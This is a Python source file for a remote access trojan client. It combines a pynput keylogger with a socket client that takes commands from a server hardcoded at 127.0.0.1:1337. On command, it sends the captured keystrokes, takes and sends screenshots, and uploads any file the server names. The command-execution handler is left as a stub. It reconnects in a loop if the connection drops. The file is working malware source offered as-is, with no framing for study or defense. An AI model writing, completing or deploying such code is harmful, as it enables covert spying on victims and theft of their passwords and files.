import os
import io
import sys
import json
import socket
import threading
import datetime
from pynput import keyboard

from PIL import ImageGrab

HOST_ADDRESS = "127.0.0.1"
HOST_PORT = 1337


class Keylogger:
    def __init__(self):
        self._buffer = ""
        self._ctrl_state = False
        self._alt_state = False
        self._key_map = {"enter": "\n", "space": " ", "tab": "\t"}

    def start(self) -> None:
        def _start_keylogger():
            with keyboard.Listener(
                on_press=self._on_press, on_release=self._on_release
            ) as listener:
                listener.join()

        threading.Thread(target=_start_keylogger).start()

    def get_keylogs(self) -> str:
        return self._buffer

    # Key press events ---------------------------------------------------------------

    def _on_press(self, key) -> None:
        """Triggered on the event of a key being pressed

        Args:
            key (pynput.keyboard._win32.keycode): Object relative to the key that was pressed
        """
        pressed = None
        if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            self._ctrl_state = True
            return
        elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
            self._alt_state = True
        if hasattr(key, "char"):
            if not hasattr(key, "vk"):
                return
            elif self._ctrl_state or self._alt_state:
                pressed = f"[{'CTRL+' if self._ctrl_state else ''}{'ALT+' if self._alt_state else ''}{chr(key.vk)}]"
            else:
                pressed = key.char
        else:
            pressed = self._key_map.get(
                key.name.split("_")[0], "[{0}]".format(key.name.split("_")[0])
            ).upper()
        self._buffer += pressed if pressed else ""

    def _on_release(self, key) -> None:
        """Triggered on the event of a key being released

        Args:
            key (pynput.keyboard._win32.keycode): Object relative to the key that was pressed
        """
        if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            self._ctrl_state = False
        elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
            self._alt_state = False


class Client:
    def __init__(self, host: str, port: int):
        self._addr = host, port
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._keylogger = Keylogger()

    def start(self):
        # start keylogger
        self._keylogger.start()
        # connect to server
        threading.Thread(target=self._connect).start()

    # Data handling ------------------------------------------------------------

    def _keylogs(self):
        """Called upon a keylogs instruction, sends any captured keylogs to the server"""
        keylogs = self._keylogger.get_keylogs()
        self._send(len(keylogs.encode("utf-8")))
        self._send(keylogs)

    def _download(self, file_path: str):
        """Called upon a download instruction, attempts to find the specified file and send it to the server

        Args:
            file_path (str): Path to the file to be sent
        """
        print(file_path)
        print(os.path.isfile(file_path))
        file_size = 0
        if os.path.isfile(file_path):
            file_size = os.path.getsize(file_path)
        self._send(str(file_size))
        if file_size > 0:
            with open(file_path, "rb") as file:
                while True:
                    data = file.read(1024)
                    if not data:
                        break
                    self._send(data)

    def _screenshot(self):
        """Called upon a screenshot instruction, captures an image of screen and sends to server"""
        img = io.BytesIO()
        ImageGrab.grab().save(img, format="PNG")
        self._send(str(img.tell()))
        self._send(img.getvalue())

    def _execute(self, cmd: str):
        """Called upon an execute instruction, executes the specified command on the client and sends any response to the server"""
        ...

    def _handle_data(self, data: dict):
        cmd = data.get("cmd")
        if cmd == "screenshot":
            self._screenshot()
        elif cmd == "download":
            self._download(data.get("args")[0])
        elif cmd == "keylogs":
            self._keylogs()
        elif cmd == "execute":
            ...

    # Server connection and communication -----------------------------------------------------

    def _send(self, data: any) -> None:
        self._sock.sendall(
            str(data).encode("utf-8") if not isinstance(data, bytes) else data
        )

    def _connect(self):
        # create a socket object
        with self._sock as sock:
            # loop to attempt to reconnect if connection is lost
            while True:
                try:
                    # connect to the server
                    sock.connect(self._addr)
                    while True:
                        data = sock.recv(1024)
                        if not data:
                            break
                        try:
                            self._handle_data(json.loads(data.decode("utf-8")))
                        except json.JSONDecodeError:
                            continue
                except OSError:
                    continue


if __name__ == "__main__":
    c = Client(HOST_ADDRESS, HOST_PORT)
    c.start()
